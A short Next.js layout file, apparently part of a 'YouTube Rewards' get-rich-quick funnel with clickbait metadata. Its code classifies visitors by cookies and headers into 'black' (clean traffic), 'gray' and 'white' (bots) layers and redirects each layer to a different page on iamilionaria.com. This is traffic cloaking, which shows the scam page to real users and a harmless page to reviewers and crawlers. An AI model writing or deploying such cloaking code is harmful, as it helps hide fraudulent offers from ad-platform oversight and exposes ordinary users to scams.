import { redirect } from 'next/navigation';
import { getUserLayer } from '@/utils/get-user-layer';
import { headers, cookies } from 'next/headers';
import type { Metadata } from 'next';

export const metadata: Metadata = {
  title: 'YouTube Rewards',
  description: 'This new YouTube tool is scaring experts around the world.',
};

export default async function Layout({
  children,
}: {
  children: React.ReactNode;
}) {
  const cks = await cookies();
  const hdrs = await headers();

  const userLayer = await getUserLayer({ cks, hdrs });

  // === REDIRECTS POR CAMADA ===
  if (userLayer === 3) {
    // Black - tráfego limpo
    redirect('https://iamilionaria.com');
  }

  if (userLayer === 2) {
    // Gray - intermediário
    redirect('https://iamilionaria.com/influencer');
  }

  // White - bots / sem parâmetro
  redirect('https://iamilionaria.com/ia');
}